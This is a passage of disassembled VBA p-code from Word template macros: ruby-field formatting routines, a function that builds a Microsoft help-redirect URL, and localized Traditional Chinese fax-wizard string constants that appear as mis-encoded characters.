' 	MemSt Cursor 
' Line #103:
' 	ElseBlock 
' Line #104:
' 	LitVarSpecial (False)
' 	St FUpdate 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #108:
' 	SetStmt 
' 	MemLdWith Range 
' 	Set rgn 
' Line #109:
' 	MemLdWith Fields 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoTo LExit 
' 	BoS 0x0000 
' 	EndIf 
' Line #110:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Fields 
' 	MemLd Count 
' 	For 
' Line #111:
' 	Ld i 
' 	Ld rgn 
' 	ArgsMemLd Fields 0x0001 
' 	MemLd Code 
' 	St szCode 
' Line #112:
' 	SetStmt 
' 	Ld i 
' 	Ld rgn 
' 	ArgsMemLd Fields 0x0001 
' 	MemLd Code 
' 	Set rgnFld 
' Line #113:
' 	Ld rgn 
' 	ArgsLd FIsRubyField 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #114:
' 	GoTo LExit 
' 	BoS 0x0000 
' Line #115:
' 	EndIfBlock 
' Line #116:
' Line #117:
' 	LitDI2 0x0001 
' 	Ld szCode 
' 	LitStr 0x0001 ","
' 	FnInStr3 
' 	Ld rgnFld 
' 	MemLd Start 
' 	Add 
' 	St iTop 
' Line #118:
' 	Ld rgnFld 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	St iEnd 
' Line #119:
' 	Ld iTop 
' 	Ld iEnd 
' 	Ld rgnFld 
' 	ArgsMemCall SetRange 0x0002 
' Line #120:
' Line #121:
' 	ArgsMemCallWith MoveLeft 0x0000 
' Line #122:
' 	SetStmt 
' 	Ld Selection 
' 	MemLd Range 
' 	Set rgnNew 
' Line #123:
' 	Ld rgnFld 
' 	MemLd FormattedText 
' 	Ld rgnNew 
' 	MemSt FormattedText 
' Line #124:
' 	ParamOmitted 
' 	Ld rgnFld 
' 	MemLd Then 
' 	FnLen 
' 	ArgsMemCallWith MoveRight 0x0002 
' Line #125:
' 	ParamOmitted 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith MoveRight 0x0003 
' Line #126:
' 	ArgsMemCallWith Delete 0x0000 
' Line #127:
' 	Ld rgnNew 
' 	ArgsMemCall Set 0x0000 
' Line #128:
' Line #129:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #130:
' 	EndWith 
' Line #131:
' 	Label LExit 
' Line #132:
' 	Ld FUpdate 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #133:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #134:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	ExitSub 
' Line #137:
' 	Label LError 
' Line #138:
' 	Ld Err 
' 	MemLd Description 
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' 	FuncDefn (Sub InitDialog())
' Line #142:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #143:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #144:
' 	Dim 
' 	VarDefn szFont (As String)
' Line #145:
' 	Dim 
' 	VarDefn szCode (As String)
' Line #146:
' 	Dim 
' 	VarDefn fnt (As Font)
' Line #147:
' 	Dim 
' 	VarDefn fntRuby (As Font)
' Line #148:
' Line #149:
' 	OnError LError 
' 	BoS 0x0000 
' Line #150:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #151:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #152:
' Line #153:
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	ArgsMemCall Clear 0x0000 
' Line #154:
' 	LitStr 0x0004 "¾a¥ª"
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	ArgsMemCall AddItem 0x0001 
' Line #155:
' 	LitStr 0x0004 "¸m¤¤"
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	ArgsMemCall AddItem 0x0001 
' Line #156:
' 	LitStr 0x000A "µ¥¶¡¶Z®i¶}"
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	ArgsMemCall AddItem 0x0001 
' Line #157:
' Line #158:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #159:
' 	SetStmt 
' 	MemLdWith Range 
' 	ArgsLd GetCurFont 0x0001 
' 	Set fnt 
' Line #160:
' 	MemLdWith Range 
' 	ArgsLd FIsRubyField 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #161:
' 	LitVarSpecial (True)
' 	Ld dlgRuby 
' 	MemLd ID_RESET 
' 	MemSt Enabled 
' Line #162:
' 	QuoteRem 0x000C 0x001A " Get Selected Field Values"
' Line #163:
' 	QuoteRem 0x000C 0x0020 " { eq \o\ad(\s\up 12(foo),bar) }"
' Line #164:
' 	Dim 
' 	VarDefn rgn (As Range)
' Line #165:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Fields 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #166:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Fields 0x0001 
' 	MemLd Code 
' 	Set rgn 
' Line #167:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Fields 0x0001 
' 	MemLd Code 
' 	MemLd Then 
' 	St szCode 
' Line #168:
' Line #169:
' 	QuoteRem 0x000C 0x0020 " { eq \o\ad(\s\up 12(foo),bar) }"
' Line #170:
' 	QuoteRem 0x000C 0x0018 "                     ~~~"
' Line #171:
' 	LitDI2 0x000B 
' 	Ld szCode 
' 	LitStr 0x0001 "("
' 	FnInStr3 
' 	St iTop 
' Line #172:
' 	LitDI2 0x0001 
' 	Ld szCode 
' 	LitStr 0x0001 ","
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Sub 
' 	St iEnd 
' Line #173:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Fields 0x0001 
' 	MemLd Code 
' 	Set rgn 
' Line #174:
' 	Ld rgn 
' 	MemLd Start 
' 	Ld iTop 
' 	Add 
' 	Ld rgn 
' 	MemLd Start 
' 	Ld iEnd 
' 	Add 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #175:
' 	SetStmt 
' 	Ld rgn 
' 	ArgsLd GetCurFont 0x0001 
' 	Set fntRuby 
' Line #176:
' 	Ld fntRuby 
' 	MemLd NameFarEast 
' 	Ld dlgRuby 
' 	MemLd IDCT_FONT 
' 	MemSt Caption 
' Line #177:
' 	Ld fntRuby 
' 	MemLd Size 
' 	Ld dlgRuby 
' 	MemLd IDCT_SIZE 
' 	MemSt Caption 
' Line #178:
' 	Ld rgn 
' 	MemLd Then 
' 	Ld dlgRuby 
' 	MemSt IDCE_TEXT 
' Line #179:
' Line #180:
' 	QuoteRem 0x000C 0x0020 " { eq \o\ad(\s\up 12(foo),bar) }"
' Line #181:
' 	QuoteRem 0x000C 0x0014 "                  ~~"
' Line #182:
' 	LitDI2 0x0001 
' 	Ld szCode 
' 	LitStr 0x0003 "up "
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Add 
' 	St iTop 
' Line #183:
' 	LitDI2 0x000B 
' 	Ld szCode 
' 	LitStr 0x0001 "("
' 	FnInStr3 
' 	St iEnd 
' Line #184:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Fields 0x0001 
' 	MemLd Code 
' 	Set rgn 
' Line #185:
' 	Ld rgn 
' 	MemLd Start 
' 	Ld iTop 
' 	Add 
' 	Ld rgn 
' 	MemLd Start 
' 	Ld iEnd 
' 	Add 
' 	Ld rgn 
' 	ArgsMemCall SetRange 0x0002 
' Line #186:
' 	Ld szCode 
' 	Ld iTop 
' 	Ld iEnd 
' 	Ld iTop 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	Ld fnt 
' 	MemLd Size 
' 	FnInt 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld dlgRuby 
' 	MemSt IDCE_DIST 
' Line #187:
' Line #188:
' 	QuoteRem 0x000C 0x0020 " { eq \o\ad(\s\up 12(foo),bar) }"
' Line #189:
' 	QuoteRem 0x000C 0x000B "        ~~~"
' Line #190:
' 	LitDI2 0x0001 
' 	Ld szCode 
' 	LitStr 0x0003 "\al"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #191:
' 	LitDI2 0x0000 
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	MemSt ListIndex 
' Line #192:
' 	LitDI2 0x0001 
' 	Ld szCode 
' 	LitStr 0x0003 "\ad"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	ElseIfBlock 
' Line #193:
' 	LitDI2 0x0002 
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	MemSt ListIndex 
' Line #194:
' 	ElseBlock 
' Line #195:
' 	LitDI2 0x0001 
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	MemSt ListIndex 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	ElseBlock 
' Line #198:
' 	LitVarSpecial (False)
' 	Ld dlgRuby 
' 	MemLd ID_RESET 
' 	MemSt Enabled 
' Line #199:
' 	LitStr 0x0000 ""
' 	Ld dlgRuby 
' 	MemSt IDCE_TEXT 
' Line #200:
' 	LitDI2 0x0000 
' 	ArgsLd Str$ 0x0001 
' 	Ld dlgRuby 
' 	MemSt IDCE_DIST 
' Line #201:
' 	Ld fnt 
' 	MemLd Size 
' 	LitDI2 0x0002 
' 	Div 
' 	FnInt 
' 	Ld dlgRuby 
' 	MemLd IDCT_SIZE 
' 	MemSt Caption 
' Line #202:
' 	Ld fnt 
' 	MemLd NameFarEast 
' 	Ld dlgRuby 
' 	MemLd IDCT_FONT 
' 	MemSt Caption 
' Line #203:
' 	LitDI2 0x0001 
' 	Ld dlgRuby 
' 	MemLd IDCD_ALIGN 
' 	MemSt ListIndex 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	Ld fmIMEModeNoControl 
' 	Ld dlgRuby 
' 	MemLd IDCE_TEXT 
' 	MemSt IMEMode 
' Line #206:
' 	Ld dlgRuby 
' 	MemLd IDCE_TEXT 
' 	ArgsMemCall SetFocus 0x0000 
' Line #207:
' 	LitDI2 0x0000 
' 	Ld dlgRuby 
' 	MemLd IDCE_TEXT 
' 	MemSt SelStart 
' Line #208:
' 	LitDI2 0x0063 
' 	Ld dlgRuby 
' 	MemLd IDCE_TEXT 
' 	MemSt SelLength 
' Line #209:
' 	Ld dlgRuby 
' 	MemLd IDCE_TEXT 
' 	MemLd Then 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #210:
' 	LitVarSpecial (True)
' 	Ld dlgRuby 
' 	MemLd IDOK 
' 	MemSt Enabled 
' Line #211:
' 	ElseBlock 
' Line #212:
' 	LitVarSpecial (False)
' 	Ld dlgRuby 
' 	MemLd IDOK 
' 	MemSt Enabled 
' Line #213:
' 	EndIfBlock 
' Line #214:
' 	EndWith 
' Line #215:
' Line #216:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #217:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #218:
' 	ExitSub 
' Line #219:
' 	Label LError 
' Line #220:
' 	Ld Err 
' 	MemLd Description 
' 	Ld SZ_MACRONAME 
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #221:
' 	EndSub 
' Line #222:
' Line #223:
' 	FuncDefn (Function FIsRubyField(rgn As , id_FFFE As Boolean) As Boolean)
' Line #224:
' 	LitVarSpecial (False)
' 	St FIsRubyField 
' Line #225:
' 	Ld rgn 
' 	MemLd Fields 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #226:
' 	LitDI2 0x0001 
' 	Ld rgn 
' 	ArgsMemLd Fields 0x0001 
' 	MemLd Code 
' 	MemLd Then 
' 	St a$ 
' Line #227:
' 	QuoteRem 0x0004 0x0020 " { eq \o\ad(\s\up 12(foo),bar) }"
' Line #228:
' 	QuoteRem 0x0004 0x0040 "   ~~~~~   ~~~~~~ and "),\s\do" is only contained Kumimoji field"
' Line #229:
' 	LineCont 0x0004 25 00 08 00
' 	Ld a$ 
' 	LitDI2 0x0006 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0006 " eq \o"
' 	Eq 
' 	Paren 
' 	LitDI2 0x0006 
' 	Ld a$ 
' 	LitStr 0x0006 "(\s\up"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	And 
' 	LitDI2 0x0009 
' 	Ld a$ 
' 	LitStr 0x0007 "),\s\do"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld a$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 ")"
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #230:
' 	LitVarSpecial (True)
' 	St FIsRubyField 
' Line #231:
' 	EndIfBlock 
' Line #232:
' 	EndFunc 
' Line #233:
' Line #234:
' Line #235:
' 	FuncDefn (Function BuildRedirString(id_FFFE As String))
' Line #236:
' Line #237:
' 	Dim 
' 	VarDefn RedirString
' Line #238:
' 	Dim 
' 	LitDI2 0x0000 
' 	LitDI2 0x000B 
' 	VarDefn Arg
' Line #239:
' 	Dim 
' 	VarDefn OS (As String)
' Line #240:
' Line #241:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	SelectCase 
' Line #242:
' 	LitStr 0x0007 "Windows"
' 	Case 
' 	CaseDone 
' Line #243:
' 	LitStr 0x0003 "Win"
' 	St OS 
' Line #244:
' 	LitStr 0x000A "Windows NT"
' 	Case 
' 	CaseDone 
' Line #245:
' 	LitStr 0x0005 "WinNT"
' 	St OS 
' Line #246:
' 	LitStr 0x0009 "Macintosh"
' 	Case 
' 	CaseDone 
' Line #247:
' 	LitStr 0x0003 "Mac"
' 	St OS 
' Line #248:
' 	CaseElse 
' Line #249:
' 	LitStr 0x0003 "Win"
' 	St OS 
' Line #250:
' 	EndSelect 
' Line #251:
' Line #252:
' 	LitStr 0x0029 "http://www.microsoft.com/isapi/redir.dll?"
' 	St RedirString$ 
' Line #253:
' Line #254:
' 	LitStr 0x0008 "PRD=Word"
' 	LitDI2 0x0000 
' 	ArgsSt Arg$ 0x0001 
' Line #255:
' 	LitStr 0x0007 "&SBP=ia"
' 	LitDI2 0x0001 
' 	ArgsSt Arg$ 0x0001 
' Line #256:
' 	LitStr 0x0007 "&PLCID="
' 	Ld wdProductLanguageID 
' 	Ld Application 
' 	ArgsMemLd International 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt Arg$ 0x0001 
' Line #257:
' 	LitStr 0x0006 "&PVER="
' 	Ld Application 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt Arg$ 0x0001 
' Line #258:
' 	LitStr 0x0004 "&OS="
' 	Ld OS 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt Arg$ 0x0001 
' Line #259:
' 	LitStr 0x0006 "&OVER="
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt Arg$ 0x0001 
' Line #260:
' 	LitStr 0x0007 "&OLCID="
' 	LitDI2 0x0006 
' 	ArgsSt Arg$ 0x0001 
' 	QuoteRem 0x0014 0x0018 "intentionally left blank"
' Line #261:
' 	LitStr 0x0007 "&CLCID="
' 	LitStr 0x0002 "0x"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0006 "Locale"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt Arg$ 0x0001 
' Line #262:
' 	LitStr 0x000D "&AR=templates"
' 	LitDI2 0x0008 
' 	ArgsSt Arg$ 0x0001 
' Line #263:
' 	LitStr 0x0004 "&O1="
' 	LitDI2 0x0009 
' 	ArgsSt Arg$ 0x0001 
' Line #264:
' 	LitStr 0x0004 "&O2="
' 	LitDI2 0x000A 
' 	ArgsSt Arg$ 0x0001 
' Line #265:
' 	LitStr 0x0004 "&O3="
' 	LitDI2 0x000B 
' 	ArgsSt Arg$ 0x0001 
' Line #266:
' Line #267:
' Line #268:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x000B 
' 	For 
' Line #269:
' 	Ld RedirString$ 
' 	Ld i 
' 	ArgsLd Arg$ 0x0001 
' 	Concat 
' 	St RedirString$ 
' Line #270:
' 	StartForVariable 
' 	Next 
' Line #271:
' Line #272:
' 	Ld RedirString$ 
' 	St BuildRedirString$ 
' Line #273:
' Line #274:
' 	EndFunc 
' Line #275:
' Line #276:
' 	FuncDefn (Sub UpdateLink())
' Line #277:
' 	Dim 
' 	VarDefn Anchor (As Range)
' Line #278:
' 	StartForVariable 
' 	Ld Hlink 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Hyperlinks 
' 	ForEach 
' 	QuoteRem 0x0030 0x001D "look at all hyperlinks in doc"
' Line #279:
' 	Ld Hlink 
' 	MemLd Address 
' 	LitStr 0x004E "http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0071 0x001A "look for address to change"
' Line #280:
' 	Ld Hlink 
' 	MemLd TypeOf 
' 	Ld msoHyperlinkRange 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0033 0x001A "get Anchor - Text Or Shape"
' Line #281:
' 	SetStmt 
' 	Ld Hlink 
' 	MemLd Range 
' 	Set Anchor 
' 	QuoteRem 0x0030 0x000B "text anchor"
' Line #282:
' 	ElseBlock 
' Line #283:
' 	SetStmt 
' 	Ld Hlink 
' 	MemLd Shape 
' 	Set Anchor 
' 	QuoteRem 0x0030 0x000C "shape anchor"
' Line #284:
' 	EndIfBlock 
' Line #285:
' 	Ld Hlink 
' 	ArgsMemCall Delete 0x0000 
' 	QuoteRem 0x0024 0x000F "delete old link"
' Line #286:
' 	Ld Anchor 
' 	ArgsLd BuildRedirString 0x0000 
' 	Ld ActiveDocument 
' 	MemLd Hyperlinks 
' 	ArgsMemCall Add 0x0002 
' 	QuoteRem 0x0046 0x001B "add new hlink in same place"
' Line #287:
' 	EndIfBlock 
' Line #288:
' 	StartForVariable 
' 	Next 
' Line #289:
' 	EndSub 
' Line #290:
' Line #291:
' 	Option  (Explicit)
' Line #292:
' Line #293:
' 	QuoteRem 0x0000 0x0010 "Standard Claimer"
' Line #294:
' Line #295:
' 	QuoteRem 0x0000 0x004F "'******************************************************************************"
' Line #296:
' 	QuoteRem 0x0000 0x000F "TO BE LOCALIZED"
' Line #297:
' 	QuoteRem 0x0000 0x004F "'******************************************************************************"
' Line #298:
' 	QuoteRem 0x0000 0x000B "Style names"
' Line #299:
' 	Reparse 0x0040 "Public Const strSTY_RETURN_ADDR     As String = "Return Address""
' Line #300:
' 	Reparse 0x0040 "Public Const strSTY_DOC_LABEL       As String = "Document Label""
' Line #301:
' 	Reparse 0x003E "Public Const strSTY_COMPANY_NAME    As String = "Company Name""
' Line #302:
' 	Reparse 0x0046 "Public Const strSTY_MSG_HDR_FIRST   As String = "Message Header First""
' Line #303:
' 	Reparse 0x0046 "Public Const strSTY_MSG_HDR_LABEL   As String = "Message Header Label""
' Line #304:
' 	Reparse 0x0045 "Public Const strSTY_MSG_HDR_LAST    As String = "Message Header Last""
' Line #305:
' Line #306:
' 	QuoteRem 0x0000 0x000C "misc strings"
' Line #307:
' 	Reparse 0x002C "Public Const strPHONE   As String = "¹q¸Ü¡G""
' Line #308:
' 	Reparse 0x0030 "Public Const strFAX     As String = "¶Ç¯u¹q¸Ü¡G""
' Line #309:
' 	Reparse 0x002E "Public Const strPAGES   As String = "Á`­¶¼Æ¡G""
' Line #310:
' 	Reparse 0x002E "Public Const strTO      As String = "¦¬¥óªÌ¡G""
' Line #311:
' 	Reparse 0x002E "Public Const strFROM    As String = "±H¥óªÌ¡G""
' Line #312:
' 	Reparse 0x002C "Public Const strDATE    As String = "¤é´Á¡G""
' Line #313:
' 	Reparse 0x002C "Public Const strRE      As String = "¥D¦®¡G""
' Line #314:
' 	Reparse 0x002C "Public Const strCC      As String = "ªþ¥»¡G""
' Line #315:
' Line #316:
' 	Reparse 0x0038 "Public Const strCOMPANY         As String = "¤½¥q¦æ¸¹¡G""
' Line #317:
' 	Reparse 0x0038 "Public Const strFAX_NUMBER      As String = "¶Ç¯u¹q¸Ü¡G""
' Line #318:
' 	Reparse 0x0034 "Public Const strPHONE_NUMBER    As String = "¹q¸Ü¡G""
' Line #319:
' 	Reparse 0x0044 "Public Const strTOTAL_NO_PAGES  As String = "¥]§t«Ê­±¦b¤ºÁ`¦@­¶¼Æ¡G""
' Line #320:
' Line #321:
' 	Reparse 0x0035 "Public Const strEMPTY_MACRO As String = "EmptyMacro ""
' Line #322:
' 	Reparse 0x004F "Public Const strNONE        As String = "<None>" 'choice to list of merge field"
' Line #323:
' 	QuoteRem 0x0031 0x001A "names found in data source"
' Line #324:
' 	QuoteRem 0x0020 0x0028 "doc. if there is no field for last name."
' Line #325:
' 	QuoteRem 0x0020 0x0029 "if the user selected this choice we don't"
' Line #326:
' 	QuoteRem 0x0020 0x0036 "insert a merge field for last name in the cover sheet."
' Line #327:
' 	Reparse 0x005A "Public Const strFLD_NAME As String = "Name" 'to select the field containing recipient name"
' Line #328:
' 	QuoteRem 0x0024 0x002A "from the fields present in the data source"
' Line #329:
' 	Reparse 0x005A "Public Const strFLD_FAX As String = "Fax" 'to select the merge field containing fax number"
' Line #330:
' Line #331:
' 	Reparse 0x0046 "Public Const strCLICK_HERE_NAME     As String = "[«ö¤@¤U³o¸Ì¿é¤J©m¦W]""
' Line #332:
' 	Reparse 0x004A "Public Const strCLICK_HERE_PAGES    As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u­¶¼Æ]""
' Line #333:
' 	Reparse 0x004A "Public Const strCLICK_HERE_SUBJECT  As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u¥D¦®]""
' Line #334:
' 	Reparse 0x004C "Public Const strCLICK_HERE_COMMENTS As String = "[«ö¤@¤U³o¸Ì¿é¤J¥²­nªºµù°O]""
' Line #335:
' 	Reparse 0x004A "Public Const strCLICK_HERE_COMPANY  As String = "[«ö¤@¤U³o¸Ì¿é¤J¤½¥q¦WºÙ]""
' Line #336:
' 	Reparse 0x004A "Public Const strCLICK_HERE_PHONE_NUMBER As String = "[«ö¤@¤U³o¸Ì¿é¤J¹q¸Ü]""
' Line #337:
' 	Reparse 0x004C "Public Const strCLICK_HERE_FAX_NUMBER As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u¹q¸Ü]""
' Line #338:
' Line #339:
' 	QuoteRem 0x0000 0x0059 "Address format to get info. from the Address book. Please be careful about the commas and"
' Line #340:
' 	QuoteRem 0x0000 0x0064 "spaces since you might end up with a space at the beginning of a name if not put at the right place."
' Line #341:
' 	QuoteRem 0x0000 0x0039 "Please change the names only if you know the correct one."
' Line #342:
' 	Reparse 0x0066 "Public Const strADDR_BK_NAME_FORMAT As String = "{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}""
' Line #343:
' 	Reparse 0x00A5 "Public Const strADDR_BK_ADDR_FORMAT As String = "{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>" & vbCr & "}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}""
' Line #344:
' 	Reparse 0x007B "Public Const strADDR_BK_FAXNUM_FORMAT As String = "{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}""
' Line #345:
' 	Reparse 0x008E "Public Const strADDR_BK_PHONE_FORMAT As String = "{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}""
' Line #346:
' 	Reparse 0x0048 "Public Const strADDR_BK_COMPANY_FORMAT As String = "{<PR_COMPANY_NAME>}""
' Line #347:
' Line #348:
' 	QuoteRem 0x0000 0x0053 "status messages put up while faxing the cover sheet and document. For some messages"
' Line #349:
' 	QuoteRem 0x0000 0x002C "I add "..." and so add "..." to all strings."
' Line #350:
' 	Reparse 0x0053 "Public Const strFAXING_DOC_RECIPIENTS As String = "¥¿¦b¶Ç¯u³o¥÷¤å¥óµ¹©Ò¦³¦¬¥óªÌ...""
' Line #351:
' 	Reparse 0x004B "Public Const strFAXING_DOC_RECIPIENT As String = "¥¿¦b¶Ç¯u³o¥÷¤å¥óµ¹¦¬¥óªÌ""
' Line #352:
' 	Reparse 0x004E "Public Const strFAXING_CS_RECIPIENTS As String = "¥¿¦b¶Ç¯u«Ê­±µ¹©Ò¦³¦¬¥óªÌ...""
' Line #353:
' 	Reparse 0x004A "Public Const strFAXING_CS_RECIPIENT As String = "¥¿¦b¶Ç¯u«Ê­±µ¹©Ò¦³¦¬¥óªÌ""
' Line #354:
' 	Reparse 0x0039 "Public Const strFAXING_CS_TO As String = "¥¿¦b¶Ç¯u«Ê­±¨ì""
' Line #355:
' 	Reparse 0x003A "Public Const strFAXING_DOC_TO As String = "¥¿¦b¶Ç¯u¤å¥ó¨ì""
' Line #356:
' Line #357:
' 	QuoteRem 0x0000 0x001A "the text in the last panel"
' Line #358:
' 	QuoteRem 0x0000 0x005E "the first one is the default. The next string is used if the user selects no cover sheet, when"
' Line #359:
' 	QuoteRem 0x0000 0x002B "we actually send the fax on clicking Finish"
' Line #360:
' 	Reparse 0x00E4 "Public Const strLAST_PANEL_DFLT_TEXT As String = "¦pªG°õ¦æºëÆF¦³°ÝÃDªº¸Ü¡A½Ð­«·s°õ¦æ¶Ç¯uºëÆF¡AÀË¬d¿é¤J¶Ç¯u¹q¸Üªº®æ¦¡¬O§_¥¿½T¡C¨Ò¦p¡A±z¬O¤£¬O§Ñ¤F¶Q¤½¥qªº¹q¸Ü¨t²Î¦b¼·¥~½u«e¡A»Ý¥ý«ö­ÓÁä¡A¤ñ¦p»¡¼Æ¦rÁä¡u9¡v¡C­n°O±o¥[¶i¶Ç¯u¹q¸Ü¤¤³á¡I""
' Line #361:
' 	Reparse 0x0071 "Public Const strLAST_PANEL_NOCOVSHT_TEXT As String = "©Ò¦³¸ê®Æ¤w¿é¤J§¹²¦¡A«ö¤@¤U§¹¦¨Áä¡AºëÆF±N°e¥X±zªº¶Ç¯u¤å¥ó¡I""
' Line #362:
' Line #363:
' 	QuoteRem 0x0000 0x003B "strings necessary to display help in case of failure of Fax"
' Line #364:
' 	Reparse 0x00A3 "Public Const strHLP_FAX_INSTALL As String = "¦pªG±z²{¦b°õ¦æªº¬O Windows 95¡A²{¦b±z´N¥i¥H¦w¸Ë¥»ºëÆF¤F¡C«ö¤U½T©wÁä¡A¿Ã¹õ¤W±N·|¥X²{»²§U»¡©ú¤å¥ó¡A§i¶D±z¦p¦ó¦w¸ËºëÆF¡I""
' Line #365:
' 	QuoteRem 0x0000 0x0040 "the next string is the title as it appears on Word's main window"
' Line #366:
' 	Reparse 0x0034 "Public Const strMS_WORD As String = "Microsoft Word""
' Line #367:
' Line #368:
' 	QuoteRem 0x0000 0x0070 "make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off"
' Line #369:
' 	QuoteRem 0x0000 0x0022 "when the command bar is displayed."
' Line #370:
' 	Reparse 0x003A "Public Const strCMD_BAR_TITLE   As String = "¤¤¤å¶Ç¯uºëÆF""
' Line #371:
' 	Reparse 0x003A "Public Const strCMD_BTN_TEXT    As String = "²{¦b°e¥X¶Ç¯u""
' Line #372:
' Line #373:
' 	Reparse 0x0039 "Public Const strCURRENT_DOC     As String = "¥Ø«eªº¤å¥ó(""
' Line #374:
' 	Reparse 0x002F "Public Const strRIGHT_PAREN     As String = ")""
' Line #375:
' Line #376:
' 	QuoteRem 0x0000 0x0064 "Window caption of the cover sheet (the document's name will follow if the user is faxing a document)"
' Line #377:
' 	Reparse 0x003C "Public Const strWINDOW_CAPTION  As String = "ªº¶Ç¯u«Ê­±ªí³æ""
' Line #378:
' 	QuoteRem 0x0000 0x004B "Window caption if user is not faxing a doc. and just created a cover sheet."
' Line #379:
' 	Reparse 0x0041 "Public Const strCOVER_SHEET_CAPTION As String = " - ¶Ç¯u«Ê­±ªí³æ""
' Line #380:
' Line #381:
' 	QuoteRem 0x0000 0x0030 "Text in merge fields inserted in the cover sheet"
' Line #382:
' 	Reparse 0x0032 "Public Const strFLD_FAX_NAME    As String = "Name""
' Line #383:
' 	Reparse 0x0037 "Public Const strFLD_FAX_NUMBER  As String = "FaxNumber""
' Line #384:
